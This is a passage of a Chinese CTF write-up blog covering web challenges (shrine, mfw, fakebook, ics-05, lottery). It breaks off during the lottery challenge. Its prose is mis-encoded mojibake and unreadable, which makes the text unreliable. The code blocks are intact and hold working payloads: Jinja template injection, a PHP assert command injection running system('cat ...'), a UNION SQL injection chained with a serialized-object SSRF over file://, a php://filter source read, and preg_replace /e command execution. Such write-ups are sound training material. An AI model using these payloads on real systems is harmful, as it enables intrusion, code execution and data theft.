alt="image-20201202100637168"></p><p>å‡ºç°äº†è¿™ä¸ªé”™è¯¯é¡µé¢ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ§åˆ¶msgçš„å€¼ï¼Œå­˜åœ¨æ¨¡æ¿æ³¨å…¥</p><p>3.è¾“å…¥<code>msg={{handler.settings}}</code>,è·å–å½“å‰çš„ç¯å¢ƒå˜é‡ï¼Œå¾—åˆ°cookie_sercetçš„å€¼ </p><p><img src="https://i.loli.net/2020/12/02/CijHGvlO7Pft8ur.png" srcset="/img/loading.gif" alt="image-20201202101520762"></p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$filename = md5(<span class="hljs-string">'/fllllllllllllag'</span>);$s = <span class="hljs-string">'cb82b218-07e3-491d-a302-532dbae27e6a'</span>;<span class="hljs-keyword">echo</span> md5($s.$filename);<span class="hljs-meta">?&gt;</span></code></pre></div><p>äºæ˜¯æ„é€ å‡ºpayload</p><div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">filename</span>=/fllllllllllllag&amp;filehash=0caf8cf587a036fabea3fa65f058c275</code></pre></div><p>æ‹¿åˆ°flag</p><p>å‚è€ƒ:<a href="https://www.cnblogs.com/cimuhuashuimu/p/11544455.html" target="_blank" rel="noopener">https://www.cnblogs.com/cimuhuashuimu/p/11544455.html</a></p><h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><div class="hljs"><pre><code class="hljs php">import flaskimport osapp = flask.Flask(__name__)app.config[<span class="hljs-string">'FLAG'</span>] = os.environ.pop(<span class="hljs-string">'FLAG'</span>)@app.route(<span class="hljs-string">'/'</span>)def index():    <span class="hljs-keyword">return</span> open(<span class="hljs-keyword">__file__</span>).read()@app.route(<span class="hljs-string">'/shrine/&lt;path:shrine&gt;'</span>)def shrine(shrine):    def safe_jinja(s):        s = s.replace(<span class="hljs-string">'('</span>, <span class="hljs-string">''</span>).replace(<span class="hljs-string">')'</span>, <span class="hljs-string">''</span>)        blacklist = [<span class="hljs-string">'config'</span>, <span class="hljs-string">'self'</span>]        <span class="hljs-keyword">return</span> <span class="hljs-string">''</span>.join([<span class="hljs-string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="hljs-keyword">for</span> c in blacklist]) + s    <span class="hljs-keyword">return</span> flask.render_template_string(safe_jinja(shrine))<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    app.run(debug=<span class="hljs-keyword">True</span>)</code></pre></div><h3 id="0x1è€ƒå¯Ÿç‚¹"><a href="#0x1è€ƒå¯Ÿç‚¹" class="headerlink" title="0x1è€ƒå¯Ÿç‚¹"></a>0x1è€ƒå¯Ÿç‚¹</h3><p>å¾ˆæ˜æ˜¾çš„flaskæ¡†æ¶</p><p>å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œä½†æ˜¯å¯¹()è¿›è¡Œäº†è¿‡æ»¤ï¼Œå¹¶å°†config , self åŠ å…¥äº†é»‘åå•ï¼Œ<code>Web_python_template_injection</code>è¿™é¢˜çš„payloadå°±æ²¡æ³•ç”¨äº†ã€‚</p><p><img src="https://i.loli.net/2020/12/02/JT7Wnk3u86IVHQe.png" srcset="/img/loading.gif" alt="image-20201202103810281"></p><h3 id="0x2æ„é€ payload"><a href="#0x2æ„é€ payload" class="headerlink" title="0x2æ„é€ payload"></a>0x2æ„é€ payload</h3><p>å¯ä»¥ä½¿ç”¨å†…ç½®å‡½æ•°<code>get_flashed_messages()</code>ï¼Œåˆå› ä¸ºconfigåœ¨current_appé‡Œé¢ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payload</p><div class="hljs"><pre><code class="hljs clojure">&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code></pre></div><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>çœ‹åˆ°äº†gitï¼Œå¯èƒ½å­˜åœ¨gitæºç æ³„éœ²</p><p><img src="https://i.loli.net/2020/12/02/M6zWQwdqsvRj1mD.png" srcset="/img/loading.gif" alt="git-1"></p><p>è®¿é—®<a href="http://220.249.52.133:44852/.git/ï¼Œç¡®å®šå­˜åœ¨æºç æ³„éœ²ï¼Œä½¿ç”¨githackä¸‹è½½æºç ï¼Œç›®å½•ç»“æ„å¦‚å›¾ï¼Œtemplatesä¸‹å­˜åœ¨flag.php,å®ƒå°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ã€‚" target="_blank" rel="noopener">http://220.249.52.133:44852/.git/ï¼Œç¡®å®šå­˜åœ¨æºç æ³„éœ²ï¼Œä½¿ç”¨githackä¸‹è½½æºç ï¼Œç›®å½•ç»“æ„å¦‚å›¾ï¼Œtemplatesä¸‹å­˜åœ¨flag.php,å®ƒå°±æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ã€‚</a></p><p><img src="https://i.loli.net/2020/12/02/BXmiCHp5bocy7Tn.png" srcset="/img/loading.gif" alt="git-2"></p><h3 id="ä»£ç å®¡è®¡"><a href="#ä»£ç å®¡è®¡" class="headerlink" title="ä»£ç å®¡è®¡"></a>ä»£ç å®¡è®¡</h3><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'page'</span>])) &#123;$page = $_GET[<span class="hljs-string">'page'</span>];&#125; <span class="hljs-keyword">else</span> &#123;$page = <span class="hljs-string">"home"</span>;&#125;$file = <span class="hljs-string">"templates/"</span> . $page . <span class="hljs-string">".php"</span>;<span class="hljs-comment">// I heard '..' is dangerous!</span>assert(<span class="hljs-string">"strpos('$file', '..') === false"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"Detected hacking attempt!"</span>);<span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> Make this look nice</span>assert(<span class="hljs-string">"file_exists('$file')"</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">"That file doesn't exist!"</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p><strong>file_exists</strong>å‡½æ•°</p><p><img src="https://i.loli.net/2020/12/02/VngSuP6h2W5xbHO.png" srcset="/img/loading.gif" alt="git-3">fil</p><p>è¾“å…¥</p><div class="hljs"><pre><code class="hljs routeros">?<span class="hljs-attribute">page</span>=flag</code></pre></div><p>é¡µé¢æ˜¾ç¤ºä¸ºç©ºï¼Œå› ä¸ºfile_existsåªèƒ½åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Œæ— æ³•è¿”å›æ–‡ä»¶å†…å®¹ï¼Œè¿™å°±ç”¨åˆ©ç”¨catè¯»å–å†…å®¹äº†ã€‚å› ä¸ºæ²¡æœ‰å¯¹pageåšå…¶ä»–çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨assert + systemï¼Œè¾¾åˆ°å‘½ä»¤æ³¨å…¥çš„ç›®çš„ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>assertå‡½æ•°ä¼šå°†ä¼ å…¥çš„å‚æ•°å½“ä½œphpä»£ç æ‰§è¡Œ</p><p>æ„é€ payloadï¼Œè¿™é‡Œå°±åƒsqlæ³¨å…¥çš„è¯­å¥ï¼Œé—­åˆå‰é¢çš„è¯­å¥å¹¶å¡«å†™è‡ªå·±æƒ³è¦çš„è¯­å¥</p><div class="hljs"><pre><code class="hljs perl">å…ˆæµ‹è¯•ä¸€ä¸‹æƒ³æ³•å¯¹ä¸å¯¹//?page=<span class="hljs-string">') or phpinfo();#</span><span class="hljs-string">//assert("file_exists('</span>$file<span class="hljs-string">') or phpinfo();)#</span><span class="hljs-string">?page='</span>)%20or%20phpinfo()%3B%23æ˜¾ç¤ºå‡ºäº†phpinfo(),æ‰€ä»¥æ€è·¯æ˜¯å¯¹çš„ç»§ç»­æ„é€ //?page=<span class="hljs-string">') or system("cat templates/flag.php"); #</span><span class="hljs-string">æœ€åçš„payload</span><span class="hljs-string"></span><span class="hljs-string">?page='</span>)%20or%20system(%22cat%20templates%2Fflag.php%22)%3B%23</code></pre></div><p><img src="https://i.loli.net/2020/12/02/Z9L2rxqjBgMyViv.png" srcset="/img/loading.gif" alt="git-4"></p><p><img src="https://i.loli.net/2020/12/02/U4TOzpaGBhHKlIV.png" srcset="/img/loading.gif" alt="git-5"></p><h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><h3 id="0x1-sqlæ³¨å…¥"><a href="#0x1-sqlæ³¨å…¥" class="headerlink" title="0x1 sqlæ³¨å…¥"></a>0x1 sqlæ³¨å…¥</h3><p>è¿›å…¥ç½‘é¡µå‘ç°æ˜¯ä¸€ä¸ªåšå®¢é¡µé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ä¸Šå»çœ‹çœ‹ï¼Œå‘ç°äº†ä¸€ä¸ªè²Œä¼¼å¯ä»¥æ³¨å…¥çš„åœ°æ–¹</p><p><code>http://220.249.52.133:44224/view.php?no=1</code>å‚æ•°noè¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªæ•°å­—å‹çš„æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•ä¸€ä¸‹ã€‚</p><p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯</p><p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>ç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šäº†å°±æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>æ¥ä¸‹æ¥ç»§ç»­æ³¨å…¥çš„å¸¸è§„æ“ä½œã€‚</p><p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>æ—¶é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œå¹¶æç¤ºäº†ç½‘ç«™çš„æ ¹ç›®å½•</p><p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" srcset="/img/loading.gif" alt></p><p>ä½†æ˜¯å½“ order by 5 # æ—¶ï¼Œç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šæ˜¯å››åˆ—ã€‚</p><p><strong>çˆ†è¡¨å</strong></p><p>æœ¬ä»¥ä¸ºä¼šé¡ºåˆ©çš„çˆ†ç ´å‡ºæ¥ï¼Œä½†æ˜¯æç¤ºäº† hacker ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨é»‘åå•æ£€æµ‹</p><p>è¯•äº†è¯•åŒå†™ç»•è¿‡ï¼Œå‘ç°ç»§ç»­æç¤ºhackï¼Œå†è¯•è¯•ç”¨/**/æ›¿æ¢ç©ºæ ¼ï¼Œè¿™æ¬¡å±…ç„¶å¯ä»¥äº†ï¼Œæš‚ä¸”å½“å®ƒæ˜¯ç¦äº†ç©ºæ ¼ã€‚è¿™é‡Œè¿˜å‡ºç°ä¸€ä¸ªæç¤º</p><div class="hljs"><pre><code class="hljs livecodeserver">Notice: unserialize(): Error <span class="hljs-keyword">at</span> <span class="hljs-built_in">offset</span> <span class="hljs-number">0</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">in</span> /var/www/html/view.php <span class="hljs-keyword">on</span> <span class="hljs-title">line</span> <span class="hljs-title">31</span>æç¤ºå­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ç»§ç»­çˆ†è¡¨ã€‚</code></pre></div><p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" srcset="/img/loading.gif" alt></p><div class="hljs"><pre><code class="hljs pgsql">?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">TABLE_NAME</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">TABLES</span> <span class="hljs-keyword">where</span> TABLE_SCHEMA=<span class="hljs-keyword">database</span>()),<span class="hljs-number">3</span>,<span class="hljs-number">4</span>#?<span class="hljs-keyword">no</span>=<span class="hljs-number">-2</span> <span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>),<span class="hljs-number">3</span>,<span class="hljs-number">4</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">'users'</span>#/<span class="hljs-comment">/**no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS**</span></code></pre></div><p>çˆ†å‡ºä¸€å¤§å †åˆ—åã€‚ç›´æ¥è¯»å–dataçš„å†…å®¹</p><div class="hljs"><pre><code class="hljs crystal">?no=-<span class="hljs-number">2</span> <span class="hljs-class"><span class="hljs-keyword">union</span>/**/<span class="hljs-title">select</span> 1,(<span class="hljs-title">select</span> <span class="hljs-title">data</span> <span class="hljs-title">from</span> <span class="hljs-title">users</span>),3,4 <span class="hljs-comment">#</span></span></code></pre></div><p>å‘ç°å†…å®¹æ˜¯æ³¨å†Œæ—¶ä¿¡æ¯ä¿å­˜ä¸ºåºåˆ—åŒ–å†…å®¹</p><div class="hljs"><pre><code class="hljs css"><span class="hljs-selector-tag">O</span><span class="hljs-selector-pseudo">:8</span><span class="hljs-selector-pseudo">:"UserInfo"</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">5</span>:<span class="hljs-string">"sunzy"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">"age"</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">22</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">"blog"</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">12</span>:<span class="hljs-string">"22.github.io"</span>;&#125;</code></pre></div><p>åˆ°è¿™é‡Œå°±ä¸çŸ¥é“æ€ä¹ˆåŠäº†ã€‚ã€‚ã€‚</p><p><strong>åšåˆ°è¿™é‡Œæˆ‘ä»¬å¤§è‡´çŸ¥é“äº†ä¸‹é¢çš„ä¿¡æ¯ï¼š</strong></p><blockquote><p>view.phpè¿›è¡Œäº†å¯¹æŸä¸ªæ•°æ®è¿›è¡Œååºåˆ—åŒ–(unserializa)æ“ä½œï¼Œä»ä¸Šé¢è·‘å‡ºçš„dataåˆ†ææ˜¯å¯¹dataè¿›è¡Œäº† ååºåˆ—åŒ–æ“ä½œ,åœ¨ä¸Šä¸€æ­¥éª¤ä¸­æˆ‘ä»¬å¾—åˆ°äº†userè¡¨æœ‰4åˆ—åˆ†åˆ«ä¸ºnoï¼Œpasswdï¼Œdataï¼Œusernameï¼Œå¹¶æ²¡æœ‰ å•ç‹¬å­˜æ”¾blogåˆ—ï¼Œæ‰€ä»¥blogæ˜¾ç¤ºåº”è¯¥æ˜¯ä»dataåˆ—å–å‡ºå†è¿›è¡Œååºåˆ—åŒ–</p></blockquote><h3 id="0x02ä»£ç å®¡è®¡"><a href="#0x02ä»£ç å®¡è®¡" class="headerlink" title="0x02ä»£ç å®¡è®¡"></a>0x02ä»£ç å®¡è®¡</h3><p>æ‰«æä¸€ä¸‹ç›®å½•å‘ç°äº†robots.txtï¼Œå…¶ä¸­ç»™å‡ºæ¥äº†æºç å¤‡ä»½æ–‡ä»¶çš„è·¯å¾„</p><p><img src="https://i.loli.net/2020/11/30/inMDXtwCpoTqgrc.png" srcset="/img/loading.gif" alt></p><p>æºç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>ä¿¡æ¯ç±»</span><span class="hljs-class"></span>&#123;    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $age, $blog)</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">$this</span>-&gt;name = $name;    <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;    <span class="hljs-keyword">$this</span>-&gt;blog = $blog;&#125;<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span> // å¤„ç†<span class="hljs-title">url</span></span><span class="hljs-function"></span>&#123;      $ch = curl_init();   <span class="hljs-comment">//åˆå§‹åŒ–ä¸€ä¸ªcurlä¼šè¯</span>    curl_setopt($ch, CURLOPT_URL, $url);   <span class="hljs-comment">//è®¾ç½®urlå’Œç›¸åº”çš„å‚æ•°</span>    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);    $output = curl_exec($ch);            <span class="hljs-comment">// æ‰§è¡Œè¿™ä¸ªcURLä¼šè¯</span>    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);  <span class="hljs-comment">//è·å–çŠ¶æ€ç </span>    <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;    &#125;    curl_close($ch);    <span class="hljs-keyword">return</span> $output;&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span></span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);&#125;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span> //è¿™æ˜¯æ³¨å†Œè´¦å·æ—¶æ£€æµ‹<span class="hljs-title">blog</span>æ˜¯å¦åˆæ³•</span><span class="hljs-function"></span>&#123;    $blog = <span class="hljs-keyword">$this</span>-&gt;blog;    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);&#125;&#125;</code></pre></div><p>å®¡è®¡æºç å‘ç°å…¶ä¸­get()å‡½æ•°å­˜åœ¨SSRF(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )æ¼æ´ã€‚</p><div class="hljs"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-variable">$url</span>)</span></span> <span class="hljs-function"><span class="hljs-title">get</span><span class="hljs-params">(<span class="hljs-variable">$this</span>-&gt;blog)</span></span></code></pre></div><p>è¿™é‡Œgetä¸­çš„å‚æ•°å–è‡ªblogï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ååºåˆ—åŒ–æ„é€ å‡ºä¸€ä¸ªssrfï¼Œå°†blogä½ç½®ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦è®¿é—®çš„ä½ç½®ï¼Œç»“åˆä¸Šé¢çš„æç¤ºå°±æ„é€ å‡ºä¸‹é¢çš„payloadï¼š</p><div class="hljs"><pre><code class="hljs groovy">?no=-2%20union/**/select%201,2,3,'O:<span class="hljs-number">8</span>:<span class="hljs-string">"UserInfo"</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-string">s:</span><span class="hljs-number">5</span>:<span class="hljs-string">"sunzy"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"age"</span>;<span class="hljs-string">i:</span><span class="hljs-number">22</span>;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"blog"</span>;<span class="hljs-string">s:</span><span class="hljs-number">29</span>:<span class="hljs-string">"file:///var/www/html/flag.php"</span>;&#125;<span class="hljs-string">'%20#</span></code></pre></div><p>æŸ¥çœ‹æºç ï¼Œè§£base64ã€‚</p><p><strong>æ€è·¯ï¼šåˆ©ç”¨noå‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ååºåˆ—åŒ–ä¸­æ„é€ fileæ–‡ä»¶åè®®ï¼Œåˆ©ç”¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´è®¿é—®æœåŠ¡å™¨ä¸Šçš„flag.phpæ–‡ä»¶ã€‚</strong></p><h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>è¿›å…¥é¡µé¢åªæœ‰ä¸€ä¸ªæ˜¯æœ‰ç”¨çš„ï¼Œè¿›å…¥è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒ</p><p><img src="https://i.loli.net/2020/12/02/Qje1Yih9dwH3xnm.png" srcset="/img/loading.gif" alt="image-20201202170901536"></p><p>å…ˆç‚¹å‡»äº‘å¹³å°è®¾å¤‡ç»´æŠ¤ä¸­å¿ƒï¼Œurlä¼šå‘ç”Ÿæ”¹å˜å‡ºç°pageå‚æ•°ï¼Œè¿™ä¸€çœ‹å°±æ˜¯å…¸å‹çš„è¯»å–æºç </p><p>æ„é€ payload:</p><div class="hljs"><pre><code class="hljs awk">?page=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=index.php</code></pre></div><p>æºç ä¸­çš„phpä»£ç </p><div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>$page = $_GET[page];<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($page)) &#123;<span class="hljs-keyword">if</span> (ctype_alnum($page)) &#123;<span class="hljs-meta">?&gt;</span>    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;    &lt;div style=<span class="hljs-string">"text-align:center"</span>&gt;        &lt;p class="lead"&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<span class="hljs-meta">&lt;?php</span>&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-meta">?&gt;</span>        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;        &lt;div style=<span class="hljs-string">"text-align:center"</span>&gt;            &lt;p class="lead"&gt;                <span class="hljs-meta">&lt;?php</span>                <span class="hljs-keyword">if</span> (strpos($page, <span class="hljs-string">'input'</span>) &gt; <span class="hljs-number">0</span>) &#123;   <span class="hljs-comment">//è¿™é‡Œæ˜¯å¯¹å‡ ä¸ªå…³é”®è¯çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬è¯»å–æºç æ—¶æ²¡æœ‰ç”¨åˆ°è¿™å‡ ä¸ªå…³é”®è¯æ‰€ä»¥æ²¡æœ‰å½±å“</span>                    <span class="hljs-keyword">die</span>();                &#125;                <span class="hljs-keyword">if</span> (strpos($page, <span class="hljs-string">'ta:text'</span>) &gt; <span class="hljs-number">0</span>) &#123;                    <span class="hljs-keyword">die</span>();                &#125;                <span class="hljs-keyword">if</span> (strpos($page, <span class="hljs-string">'text'</span>) &gt; <span class="hljs-number">0</span>) &#123;                    <span class="hljs-keyword">die</span>();                &#125;                <span class="hljs-keyword">if</span> ($page === <span class="hljs-string">'index.php'</span>) &#123;                    <span class="hljs-keyword">die</span>(<span class="hljs-string">'Ok'</span>);                &#125;                    <span class="hljs-keyword">include</span>($page);                    <span class="hljs-keyword">die</span>();                <span class="hljs-meta">?&gt;</span>        &lt;/p&gt;        &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;<span class="hljs-meta">&lt;?php</span>&#125;&#125;<span class="hljs-comment">//æ–¹ä¾¿çš„å®ç°è¾“å…¥è¾“å‡ºçš„åŠŸèƒ½,æ­£åœ¨å¼€å‘ä¸­çš„åŠŸèƒ½ï¼Œåªèƒ½å†…éƒ¨äººå‘˜æµ‹è¯•</span><span class="hljs-keyword">if</span> ($_SERVER[<span class="hljs-string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="hljs-string">'127.0.0.1'</span>) &#123; <span class="hljs-comment">//xxfå¤´</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;          $pattern = $_GET[pat];  <span class="hljs-comment">//get æäº¤ä¸‰ä¸ªå‚æ•°</span>    $replacement = $_GET[rep];    $subject = $_GET[sub];    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($pattern) &amp;&amp; <span class="hljs-keyword">isset</span>($replacement) &amp;&amp; <span class="hljs-keyword">isset</span>($subject)) &#123;        preg_replace($pattern, $replacement, $subject);    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">die</span>();    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>å‰é¢ä»£ç æ²¡æœ‰çªç ´ç‚¹ï¼Œç›´åˆ°çœ‹åˆ°<code>preg_replace</code></p><p><img src="https://i.loli.net/2020/12/02/4FfYrPBc1xE9Kzk.png" srcset="/img/loading.gif" alt="preg_replace"></p><p>æ¼æ´</p><p>$pattern å­˜åœ¨ /e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå…è®¸ä»£ç æ‰§è¡Œ</p><p>/e æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œæ˜¯ *<em>preg_replace() *</em> å¯¼è‡´ $replacement éƒ¨åˆ†å½“åšphpä»£ç æ¥æ‰§è¡Œã€‚</p><p>æ‰€ä»¥å¯ä»¥æ„é€ å¦‚ä¸‹</p><p>payload</p><div class="hljs"><pre><code class="hljs sas">?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">'ls'</span>)<span class="hljs-variable">&amp;sub</span>=test?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">'ls s3chahahaDir/'</span>)<span class="hljs-variable">&amp;sub</span>=test?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">'ls s3chahahaDir/flag'</span>)<span class="hljs-variable">&amp;sub</span>=test?pat=/test/e<span class="hljs-variable">&amp;rep</span><span class="hljs-meta">=system(</span><span class="hljs-string">'cat s3chahahaDir/flag/flag.php'</span>)<span class="hljs-variable">&amp;sub</span>=test</code></pre></div><p>å‚è€ƒ:<a href="https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html" target="_blank" rel="noopener">https://kevens10.github.io/articles/preg_replace()%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</a> </p><h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><h3 id="0x1æ³¨å†Œç©ä¸€ä¸‹"><a href="#0x1æ³¨å†Œç©ä¸€ä¸‹" class="headerlink" title="0x1æ³¨å†Œç©ä¸€ä¸‹"></a>0x1æ³¨å†Œç©ä¸€ä¸‹</h3><p>â€‹        è¿›å…¥é¡µé¢å‘ä¸‹æ˜¯ä¸€ä¸ªä¹°å½©ç¥¨çš„ï¼Œå…ˆæ³¨å†Œä¸€ä¸ªè´¦å·ï¼Œåˆå§‹æœ‰20å—é’±ï¼Œè¦ä¹°flagï¼Œéœ€è¦99999999ï¼Œæ˜¾ç„¶ä¸å¯èƒ½</p><p>è¿˜æœ‰ä¸€ä¸ªä¹°å½©ç¥¨çš„åœ°æ–¹ï¼Œæ¯æ¬¡èŠ±2å—é’±ä¸¤ä¸ªå·ç å¯¹äº†å¥–åŠ±äº”å—ï¼Œè¿™äº›éƒ½ä¸é‡è¦ã€‚</p><p><img src="https://i.loli.net/2020/12/02/f2TOhKdw1Bo9QY6.png" srcset="/img/loading.gif" alt="image-20201202220622597"></p><p>å¼€å§‹æ˜¯æƒ³ç€é€šè¿‡è„šæœ¬å¤šä¹°å‡ æ¬¡ï¼Œåæ¥å‘ç°ä¸å¯¹å•Šï¼Œæ¯æ¬¡éƒ½æ˜¯ä¹°å®Œäº†ä¹‹åä¸­å°†å·ç æ‰å…¬å¸ƒå‡ºæ¥ï¼Œè„šæœ¬å°±æ²¡æ„ä¹‰äº†ï¼Œæ‰€ä»¥è¿™ä¸ªæƒ³æ³•æ–­äº†ã€‚</p><p>äºæ˜¯å»çœ‹çœ‹äº†åˆ«çš„</p><h3 id="0x2-gitæºç æ³„éœ²"><a href="#0x2-gitæºç æ³„éœ²" class="headerlink" title="0x2 gitæºç æ³„éœ²"></a>0x2 gitæºç æ³„éœ²</h3><p>â€‹        ä¸‹è½½äº†å¥½å‡ ä¸ªæ–‡ä»¶ï¼Œçœ‹çœ‹äº†å…¶ä¸­æœ‰ç”¨çš„åªæœ‰<code>api.php</code>ï¼Œä»£ç å¤ªé•¿äº†ï¼Œå¤åˆ¶äº†é‡è¦çš„éƒ¨åˆ†</p><p>å®¡è®¡ä»£ç 